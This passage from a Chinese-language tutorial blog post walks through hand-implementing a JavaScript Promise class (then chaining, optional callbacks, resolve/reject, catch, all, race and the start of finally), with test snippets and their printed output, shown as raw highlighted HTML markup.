class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">const</span> promise = <span class="keyword">new</span> MyPromise(<span class="function">(<span class="params">resolve, reject</span>) =&gt;</span> &#123;</span><br><span class="line">    resolve(<span class="string">&#x27;success&#x27;</span>)</span><br><span class="line">    <span class="comment">// throw new Error(&#x27;执行器错误&#x27;)</span></span><br><span class="line"> &#125;)</span><br><span class="line"> </span><br><span class="line"><span class="comment">// 第一个then方法中的错误要在第二个then方法中捕获到</span></span><br><span class="line">promise.then(<span class="function"><span class="params">value</span> =&gt;</span> &#123;</span><br><span class="line">  <span class="built_in">console</span>.log(<span class="number">1</span>)</span><br><span class="line">  <span class="built_in">console</span>.log(<span class="string">&#x27;resolve&#x27;</span>, value)</span><br><span class="line">  <span class="keyword">throw</span> <span class="keyword">new</span> <span class="built_in">Error</span>(<span class="string">&#x27;then error&#x27;</span>)</span><br><span class="line">&#125;, <span class="function"><span class="params">reason</span> =&gt;</span> &#123;</span><br><span class="line">  <span class="built_in">console</span>.log(<span class="number">2</span>)</span><br><span class="line">  <span class="built_in">console</span>.log(reason.message)</span><br><span class="line">&#125;).then(<span class="function"><span class="params">value</span> =&gt;</span> &#123;</span><br><span class="line">  <span class="built_in">console</span>.log(<span class="number">3</span>)</span><br><span class="line">  <span class="built_in">console</span>.log(value);</span><br><span class="line">&#125;, <span class="function"><span class="params">reason</span> =&gt;</span> &#123;</span><br><span class="line">  <span class="built_in">console</span>.log(<span class="number">4</span>)</span><br><span class="line">  <span class="built_in">console</span>.log(reason.message)</span><br><span class="line">&#125;)</span><br></pre></td></tr></table></figure><p>执行结果 </p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">1</span></span><br><span class="line">resolve success</span><br><span class="line"><span class="number">4</span></span><br><span class="line">then error</span><br></pre></td></tr></table></figure><p>这里成功打印了1中抛出的错误 <code>then error</code></p><h3 id="参考-fulfilled-状态下的处理方式，对-rejected-和-pending-状态进行改造"><a href="#参考-fulfilled-状态下的处理方式，对-rejected-和-pending-状态进行改造" class="headerlink" title="参考 fulfilled 状态下的处理方式，对 rejected 和 pending 状态进行改造"></a>参考 fulfilled 状态下的处理方式，对 rejected 和 pending 状态进行改造</h3><p><strong>改造内容包括：</strong></p><blockquote><ol><li>增加异步状态下的链式调用</li><li>增加回调函数执行结果的判断</li><li>增加识别 Promise 是否返回自己</li><li>增加错误捕获</li></ol></blockquote><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="title">then</span>(<span class="params">onFulfilled, onRejected</span>)</span> &#123;</span><br><span class="line">    <span class="comment">// 为了链式调用这里直接创建一个MyPromise，并在后面return出去</span></span><br><span class="line">    <span class="comment">// promise有暂时性死区，初始化之后才能使用</span></span><br><span class="line">    <span class="keyword">const</span> promise = <span class="keyword">new</span> MyPromise(<span class="function">(<span class="params">resolve, reject</span>) =&gt;</span> &#123;</span><br><span class="line">        <span class="comment">// 这里的内容在执行器中，会立即执行</span></span><br><span class="line">        <span class="keyword">if</span> (<span class="built_in">this</span>.status === FULFILLED) &#123;</span><br><span class="line">            <span class="comment">// 创建一个微任务等待 promise 完成初始化</span></span><br><span class="line">            queueMicrotask(<span class="function">() =&gt;</span> &#123;</span><br><span class="line">                <span class="keyword">try</span> &#123;</span><br><span class="line">                    <span class="comment">// 获取成功回调函数的执行结果</span></span><br><span class="line">                    <span class="keyword">const</span> result = onFulfilled(<span class="built_in">this</span>.value);</span><br><span class="line">                    <span class="comment">// 传入 resolvePromise 集中处理</span></span><br><span class="line">                    resolvePromise(promise, result, resolve, reject);</span><br><span class="line">                &#125; <span class="keyword">catch</span> (error) &#123;</span><br><span class="line">                    reject(error)</span><br><span class="line">                &#125;</span><br><span class="line"></span><br><span class="line">            &#125;)</span><br><span class="line">        &#125; <span class="keyword">else</span> <span class="keyword">if</span> (<span class="built_in">this</span>.status === REJECTED) &#123;</span><br><span class="line">            <span class="comment">// 调用失败回调，并且把原因返回</span></span><br><span class="line">            queueMicrotask(<span class="function">() =&gt;</span> &#123;</span><br><span class="line">                <span class="keyword">try</span> &#123;</span><br><span class="line">                    <span class="keyword">const</span> result = onRejected(<span class="built_in">this</span>.reason);</span><br><span class="line">                    resolvePromise(promise, result, resolve, reject);</span><br><span class="line">                &#125; <span class="keyword">catch</span> (error) &#123;</span><br><span class="line">                    reject(error);</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;)</span><br><span class="line"></span><br><span class="line">        &#125; <span class="keyword">else</span> <span class="keyword">if</span> (<span class="built_in">this</span>.status === PENDING) &#123;</span><br><span class="line">            <span class="comment">// 因为不知道后面状态的变化情况，所以将成功回调和失败回调存储起来</span></span><br><span class="line">            <span class="comment">// 等到执行成功失败函数的时候再传递</span></span><br><span class="line">            <span class="built_in">this</span>.onFulfilledCallbacks.push(<span class="function">() =&gt;</span> &#123;</span><br><span class="line">                queueMicrotask(<span class="function">() =&gt;</span> &#123;</span><br><span class="line">                    <span class="keyword">try</span> &#123;</span><br><span class="line">                        <span class="keyword">const</span> result = onFulfilled(<span class="built_in">this</span>.value);</span><br><span class="line">                        resolvePromise(promise, result, resolve, reject);</span><br><span class="line">                    &#125; <span class="keyword">catch</span> (error) &#123;</span><br><span class="line">                        reject(error);</span><br><span class="line">                    &#125;</span><br><span class="line">                &#125;)</span><br><span class="line">            &#125;);</span><br><span class="line">            <span class="built_in">this</span>.onRejectedCallbacks.push(<span class="function">() =&gt;</span> &#123;</span><br><span class="line">                queueMicrotask(<span class="function">() =&gt;</span> &#123;</span><br><span class="line">                    <span class="keyword">try</span> &#123;</span><br><span class="line">                        <span class="keyword">const</span> result = onRejected(<span class="built_in">this</span>.reason);</span><br><span class="line">                        resolvePromise(promise, result, resolve, reject);</span><br><span class="line">                    &#125; <span class="keyword">catch</span> (error) &#123;</span><br><span class="line">                        reject(error);</span><br><span class="line">                    &#125;</span><br><span class="line">                &#125;)</span><br><span class="line">            &#125;);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="comment">// 封装一个函数统一处理回调函数的执行结果 </span></span><br><span class="line">        <span class="function"><span class="keyword">function</span> <span class="title">resolvePromise</span>(<span class="params">promise, result, resolve, reject</span>) </span>&#123;</span><br><span class="line">            <span class="comment">// 如果相等了，说明return的是自己，抛出类型错误并返回</span></span><br><span class="line">            <span class="keyword">if</span> (promise === result) &#123;</span><br><span class="line">                <span class="keyword">return</span> reject(<span class="keyword">new</span> <span class="built_in">TypeError</span>(<span class="string">&#x27;Chaining cycle detected for promise #&lt;Promise&gt;&#x27;</span>))</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            <span class="comment">// 判断result是不是 MyPromise 实例对象</span></span><br><span class="line">            <span class="keyword">if</span> (result <span class="keyword">instanceof</span> MyPromise) &#123;</span><br><span class="line">                <span class="comment">// 执行 result，调用 then 方法，目的是将其状态变为 fulfilled 或者 rejected</span></span><br><span class="line">                <span class="comment">// result.then(value =&gt; resolve(value), reason =&gt; reject(reason))</span></span><br><span class="line">                <span class="comment">// 简化之后</span></span><br><span class="line">                result.then(resolve, reject);</span><br><span class="line">            &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                <span class="comment">// 普通值</span></span><br><span class="line">                resolve(result);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    &#125;)</span><br><span class="line">    <span class="keyword">return</span> promise;</span><br><span class="line">&#125;    </span><br></pre></td></tr></table></figure><h3 id="then-中的参数变为可选"><a href="#then-中的参数变为可选" class="headerlink" title="then 中的参数变为可选"></a>then 中的参数变为可选</h3><p>上面我们处理 then 方法的时候都是默认传入 onFulfilled、onRejected 两个回调函数，但是实际上原生 Promise 是可以选择参数的单传或者不传，都不会影响执行。</p><p>例如下面这种 </p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">const</span> promise = <span class="keyword">new</span> <span class="built_in">Promise</span>(<span class="function">(<span class="params">resolve, reject</span>) =&gt;</span> &#123;</span><br><span class="line">  resolve(<span class="number">100</span>)</span><br><span class="line">&#125;)</span><br><span class="line"></span><br><span class="line">promise</span><br><span class="line">  .then()</span><br><span class="line">  .then()</span><br><span class="line">  .then()</span><br><span class="line">  .then(<span class="function"><span class="params">value</span> =&gt;</span> <span class="built_in">console</span>.log(value))</span><br><span class="line"></span><br><span class="line"><span class="comment">// 输出 100</span></span><br></pre></td></tr></table></figure><p>所以我们需要对 then 方法做一点小小的调整</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="title">then</span>(<span class="params">onFulfilled, onRejected</span>)</span> &#123;</span><br><span class="line">  <span class="comment">// 如果不传，就使用默认函数</span></span><br><span class="line">  onFulfilled = <span class="keyword">typeof</span> onFulfilled === <span class="string">&#x27;function&#x27;</span> ? onFulfilled : <span class="function"><span class="params">value</span> =&gt;</span> value;</span><br><span class="line">  onRejected = <span class="keyword">typeof</span> onRejected === <span class="string">&#x27;function&#x27;</span> ? onRejected : <span class="function"><span class="params">reason</span> =&gt;</span> &#123;<span class="keyword">throw</span> reason&#125;;</span><br><span class="line">  ......</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>改造完自然是需要验证一下的</p><p><strong>先看情况一</strong>：resolve 之后</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">const</span> promise = <span class="keyword">new</span> MyPromise(<span class="function">(<span class="params">resolve, reject</span>) =&gt;</span> &#123;</span><br><span class="line">  resolve(<span class="string">&#x27;succ&#x27;</span>)</span><br><span class="line">&#125;)</span><br><span class="line"> </span><br><span class="line">promise.then().then().then(<span class="function"><span class="params">value</span> =&gt;</span> <span class="built_in">console</span>.log(value))</span><br><span class="line"></span><br><span class="line"><span class="comment">// 打印 succ</span></span><br></pre></td></tr></table></figure><p><strong>先看情况一</strong>：reject 之后</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">const</span> promise = <span class="keyword">new</span> MyPromise(<span class="function">(<span class="params">resolve, reject</span>) =&gt;</span> &#123;</span><br><span class="line">  reject(<span class="string">&#x27;err&#x27;</span>)</span><br><span class="line">&#125;)</span><br><span class="line"> </span><br><span class="line">promise.then().then().then(<span class="function"><span class="params">value</span> =&gt;</span> <span class="built_in">console</span>.log(value), <span class="function"><span class="params">reason</span> =&gt;</span> <span class="built_in">console</span>.log(reason))</span><br><span class="line"><span class="comment">// 打印 err</span></span><br></pre></td></tr></table></figure><h3 id="Promise-resolve-amp-Promise-reject"><a href="#Promise-resolve-amp-Promise-reject" class="headerlink" title="Promise.resolve() &amp; Promise.reject()"></a>Promise.resolve() &amp; Promise.reject()</h3><p>就像开头挂的那道面试题使用 <code>return Promise.resolve</code> 来返回一个 Promise 对象，我们用现在的手写代码尝试一下</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">MyPromise.resolve().then(<span class="function">() =&gt;</span> &#123;</span><br><span class="line">    <span class="built_in">console</span>.log(<span class="number">0</span>);</span><br><span class="line">    <span class="keyword">return</span> MyPromise.resolve(<span class="number">4</span>);</span><br><span class="line">&#125;).then(<span class="function">(<span class="params">res</span>) =&gt;</span> &#123;</span><br><span class="line">    <span class="built_in">console</span>.log(res)</span><br><span class="line">&#125;)</span><br></pre></td></tr></table></figure><p>结果它报错了 😥</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">MyPromise.resolve().then(<span class="function">() =&gt;</span> &#123;</span><br><span class="line">          ^</span><br><span class="line"></span><br><span class="line"><span class="built_in">TypeError</span>: MyPromise.resolve is not a <span class="function"><span class="keyword">function</span></span></span><br></pre></td></tr></table></figure><p>除了 Promise.resolve 还有 Promise.reject 的用法，我们都要去支持，接下来我们来实现一下</p><p><code>Promise.resolve(value)</code>方法返回一个以给定值解析后的<code>Promise</code>]对象。</p><ul><li>如果这个值是一个 promise ，那么将返回这个 promise ；</li><li>如果这个值是thenable（即带有<code>&quot;then&quot; </code>方法），返回的promise会“跟随”这个thenable的对象，采用它的最终状态；(<strong>尚未实现</strong>)</li><li>否则返回的promise将以此值<strong>完成</strong>。</li></ul><p>此函数将类promise对象的多层嵌套展平。</p><p><code>Promise.reject()</code>方法返回一个带有拒绝原因的<code>Promise</code>对象。</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line">MyPromise &#123;</span><br><span class="line">  ......</span><br><span class="line">  <span class="comment">// resolve 静态方法</span></span><br><span class="line">    <span class="keyword">static</span> <span class="function"><span class="title">resolve</span>(<span class="params">value</span>)</span> &#123;</span><br><span class="line">        <span class="comment">// 如果这个值是一个 promise ，那么将返回这个 promise </span></span><br><span class="line">        <span class="keyword">if</span> (value <span class="keyword">instanceof</span> MyPromise) &#123;</span><br><span class="line">            <span class="keyword">return</span> value;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="comment">// 否则返回的promise将以此值完成。</span></span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">new</span> MyPromise(<span class="function"><span class="params">resolve</span> =&gt;</span> &#123;</span><br><span class="line">            resolve(value);</span><br><span class="line">        &#125;);</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">  <span class="comment">// reject 静态方法</span></span><br><span class="line">  <span class="keyword">static</span> reject (reason) &#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="keyword">new</span> MyPromise(<span class="function">(<span class="params">resolve, reject</span>) =&gt;</span> &#123;</span><br><span class="line">      reject(reason);</span><br><span class="line">    &#125;);</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>执行结果 </p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">0</span></span><br><span class="line"><span class="number">4</span></span><br></pre></td></tr></table></figure><h3 id="Promise-prototype-catch"><a href="#Promise-prototype-catch" class="headerlink" title="Promise.prototype.catch()"></a>Promise.prototype.catch()</h3><blockquote><p><code>catch()方法</code>返回一个Promise，并且处理拒绝的情况。它的行为与调用Promise.prototype.then(undefined, onRejected) 相同。</p></blockquote><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//catch方法其实就是执行一下then的第二个回调</span></span><br><span class="line"><span class="keyword">catch</span>(onRejected)&#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">this</span>.then(<span class="literal">undefined</span>,onRejected);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="Promise-all"><a href="#Promise-all" class="headerlink" title="Promise.all()"></a>Promise.all()</h3><p><code>Promise.all()</code> 方法接收一个promise的<code>iterable</code>类型（注：<code>Array</code>，<code>Map</code>，<code>Set</code>都属于ES6的iterable类型）的输入，并且<strong>只返回一个Promise实例</strong>， 那个输入的所有promise的resolve回调的结果是一个<strong>数组</strong>。</p><p>这个Promise的resolve回调执行是在<strong>所有输入的promise的resolve回调都结束，或者输入的iterable里没有promise了</strong>的时候。</p><p>它的reject回调执行是，<strong>只要任何一个输入的promise的reject回调执行或者输入不合法的promise就会立即抛出错误，并且reject的是第一个抛出的错误信息</strong>。</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//all 静态方法</span></span><br><span class="line"><span class="keyword">static</span> <span class="function"><span class="title">all</span>(<span class="params">promiseArr</span>)</span> &#123;</span><br><span class="line">    <span class="keyword">let</span> index = <span class="number">0</span>;<span class="comment">//记录resolve次数</span></span><br><span class="line">    <span class="keyword">let</span> result = [];<span class="comment">// 输入的所有promise的resolve回调的结果</span></span><br><span class="line">    <span class="keyword">return</span> <span class="keyword">new</span> MyPromise(<span class="function">(<span class="params">resolve, reject</span>) =&gt;</span> &#123;</span><br><span class="line">        promiseArr.forEach(<span class="function">(<span class="params">p, i</span>) =&gt;</span> &#123;</span><br><span class="line">            <span class="comment">//Promise.resolve(p)用于处理传入值不为Promise的情况</span></span><br><span class="line">            MyPromise.resolve(p).then(</span><br><span class="line">                <span class="function"><span class="params">val</span> =&gt;</span> &#123;</span><br><span class="line">                    index++;</span><br><span class="line">                    result[i] = val;</span><br><span class="line">                    <span class="comment">//所有then执行后, resolve结果,结果为一个数组</span></span><br><span class="line">                    <span class="keyword">if</span> (index === promiseArr.length) &#123;</span><br><span class="line">                        resolve(result);</span><br><span class="line">                    &#125;</span><br><span class="line">                &#125;,</span><br><span class="line">                <span class="function"><span class="params">err</span> =&gt;</span> &#123;</span><br><span class="line">                    <span class="comment">//有一个Promise被reject时，MyPromise的状态变为reject</span></span><br><span class="line">                    reject(err)</span><br><span class="line">                &#125;</span><br><span class="line">            )</span><br><span class="line">        &#125;)</span><br><span class="line">    &#125;)</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>测试一下</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">const</span> promise1 = MyPromise.resolve(<span class="number">3</span>);</span><br><span class="line"><span class="keyword">const</span> promise2 = <span class="number">42</span>;</span><br><span class="line"><span class="keyword">const</span> promise3 = <span class="keyword">new</span> MyPromise(<span class="function">(<span class="params">resolve, reject</span>) =&gt;</span> &#123;</span><br><span class="line">  <span class="built_in">setTimeout</span>(resolve, <span class="number">100</span>, <span class="string">&#x27;foo&#x27;</span>);</span><br><span class="line">&#125;);</span><br><span class="line"></span><br><span class="line">MyPromise.all([promise1, promise2, promise3]).then(<span class="function">(<span class="params">values</span>) =&gt;</span> &#123;</span><br><span class="line">  <span class="built_in">console</span>.log(values);</span><br><span class="line">&#125;);</span><br><span class="line"><span class="comment">// output: Array [3, 42, &quot;foo&quot;]</span></span><br><span class="line"><span class="keyword">var</span> p1 = <span class="keyword">new</span> MyPromise(<span class="function">(<span class="params">resolve, reject</span>) =&gt;</span> &#123;</span><br><span class="line">  <span class="built_in">setTimeout</span>(resolve, <span class="number">1000</span>, <span class="string">&#x27;one&#x27;</span>);</span><br><span class="line">&#125;);</span><br><span class="line"><span class="keyword">var</span> p2 = <span class="keyword">new</span> MyPromise(<span class="function">(<span class="params">resolve, reject</span>) =&gt;</span> &#123;</span><br><span class="line">  <span class="built_in">setTimeout</span>(resolve, <span class="number">2000</span>, <span class="string">&#x27;two&#x27;</span>);</span><br><span class="line">&#125;);</span><br><span class="line"><span class="keyword">var</span> p3 = <span class="keyword">new</span> MyPromise(<span class="function">(<span class="params">resolve, reject</span>) =&gt;</span> &#123;</span><br><span class="line">  <span class="built_in">setTimeout</span>(resolve, <span class="number">3000</span>, <span class="string">&#x27;three&#x27;</span>);</span><br><span class="line">&#125;);</span><br><span class="line"><span class="keyword">var</span> p4 = <span class="keyword">new</span> MyPromise(<span class="function">(<span class="params">resolve, reject</span>) =&gt;</span> &#123;</span><br><span class="line">  <span class="built_in">setTimeout</span>(resolve, <span class="number">4000</span>, <span class="string">&#x27;four&#x27;</span>);</span><br><span class="line">&#125;);</span><br><span class="line"><span class="keyword">var</span> p5 = <span class="keyword">new</span> MyPromise(<span class="function">(<span class="params">resolve, reject</span>) =&gt;</span> &#123;</span><br><span class="line">  reject(<span class="string">&#x27;reject&#x27;</span>);</span><br><span class="line">&#125;);</span><br><span class="line"></span><br><span class="line">MyPromise.all([p1, p2, p3, p4, p5]).then(<span class="function"><span class="params">values</span> =&gt;</span> &#123;</span><br><span class="line">  <span class="built_in">console</span>.log(values);</span><br><span class="line">&#125;, <span class="function"><span class="params">reason</span> =&gt;</span> &#123;</span><br><span class="line">  <span class="built_in">console</span>.log(reason)</span><br><span class="line">&#125;);</span><br><span class="line"><span class="comment">//&quot;reject&quot;</span></span><br></pre></td></tr></table></figure><h3 id="Promise-race"><a href="#Promise-race" class="headerlink" title="Promise.race()"></a>Promise.race()</h3><p><strong><code>Promise.race(iterable)</code></strong> 方法返回一个 promise，<strong>一旦迭代器中的某个promise解决或拒绝，返回的promise就会解决或拒绝。</strong></p><p>状态只能由 <code>Pending --&gt; Fulfilled</code> 或者 <code>Pending --&gt; Rejected</code>，且<strong>一旦发生改变不可二次修改</strong>。</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">static</span> <span class="function"><span class="title">race</span>(<span class="params">promiseArr</span>)</span> &#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="keyword">new</span> MyPromise(<span class="function">(<span class="params">resolve, reject</span>) =&gt;</span> &#123;</span><br><span class="line">        <span class="comment">//同时执行Promise,如果有一个Promise的状态发生改变,就变更新MyPromise的状态</span></span><br><span class="line">        <span class="keyword">for</span> (<span class="keyword">let</span> p <span class="keyword">of</span> promiseArr) &#123;</span><br><span class="line">            <span class="comment">//Promise.resolve(p)用于处理传入值不为Promise的情况</span></span><br><span class="line">            MyPromise.resolve(p).then(resolve,reject);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;)</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>测试一下</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">const</span> promise1 = <span class="keyword">new</span> <span class="built_in">Promise</span>(<span class="function">(<span class="params">resolve, reject</span>) =&gt;</span> &#123;</span><br><span class="line">  <span class="built_in">setTimeout</span>(resolve, <span class="number">500</span>, <span class="string">&#x27;one&#x27;</span>);</span><br><span class="line">&#125;);</span><br><span class="line"></span><br><span class="line"><span class="keyword">const</span> promise2 = <span class="keyword">new</span> <span class="built_in">Promise</span>(<span class="function">(<span class="params">resolve, reject</span>) =&gt;</span> &#123;</span><br><span class="line">  <span class="built_in">setTimeout</span>(resolve, <span class="number">100</span>, <span class="string">&#x27;two&#x27;</span>);</span><br><span class="line">&#125;);</span><br><span class="line"></span><br><span class="line"><span class="built_in">Promise</span>.race([promise1, promise2]).then(<span class="function">(<span class="params">value</span>) =&gt;</span> &#123;</span><br><span class="line">  <span class="built_in">console</span>.log(value);</span><br><span class="line">  <span class="comment">// Both resolve, but promise2 is faster</span></span><br><span class="line">&#125;);</span><br><span class="line"><span class="comment">// expected output: &quot;two&quot;</span></span><br></pre></td></tr></table></figure><h3 id="Promise-prototype-finally"><a href="#Promise-prototype-finally" class="headerlink" title="Promise.prototype.finally()"></a>Promise.prototype.finally()</h3><p><code>finally()</code> 方法返回一个<code>Promise</code>。在promise<strong>结束</strong>时，无论结果是fulfilled或者是rejected，都会执行指定的<strong>回调函数</strong>。</p><p>这为在<code>Promise</code>是否成功完成后都需要执行的代码提供了一种方式。</p><p>这避免了同样的语句需要在<code>then()</code>和<code>catch()</code>中各写一次的情况。</p><p>如果你想在 promise 执行完毕后无论其结果怎样都做一些处理或清理时，<code>finally()</code> 方法可能是有用的。</p><p><code>finally()</code> 虽然与 <code>.then(onFinally, onFinally)</code> 类似，它们不同的是：</p><ul><li>调用内联函数时，不需要多次声明该函数或为该函数创建一个变量保存它。</li><li>由于无法知道<code>promise</code>的最终状态，所以<code>finally</code>的回调函数中不接收任何参数，它仅用于无论最终结果如何都要执行的情况。</li><li>与<code>Promise.resolve(2).then(() =&gt; &#123;&#125;, () =&gt; &#123;&#125;)</code> （resolved的结果为<code>undefined</code>）不同，<code>Promise.resolve(2).finally(() =&gt; &#123;&#125;)</code> resolved的结果为 <code>2</code>。</li><li>同样，<code>Promise.reject(3).then(() =&gt; &#123;&#125;, () =&gt; &#123;&#125;)</code> (rejected的结果为<code>undefined</code>), <code>Promise.reject(3).finally(() =&gt; &#123;&#125;)</code> rejected 的结果为 <code>3</code>。</li></ul><p><strong>备注：</strong> 在<code>finally</code>回调中 <code>throw</code>（或返回被拒绝的promise）将以 <code>throw()</code> 指定的原因拒绝新的promise.</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//finally方法</span></span><br><span class="line"><span class="function"><span class="title">finally</span>(<span class="params">callback</span>)</span> &#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">this</span>.then(</span><br><span class="line">        <span class="comment">// MyPromise.resolve执行回调,并在then中return结果传递给后面的Promise</span></span><br><span class="line">        <span class="function"><span class="params">value</span> =&gt;</span> MyPromise.resolve(callback()).then(<span class="function">() =&gt;</span> value),    </span><br><span class="line">        <span class="comment">// reject同理         </span></span><br><span class="line">        <span class="function"><span 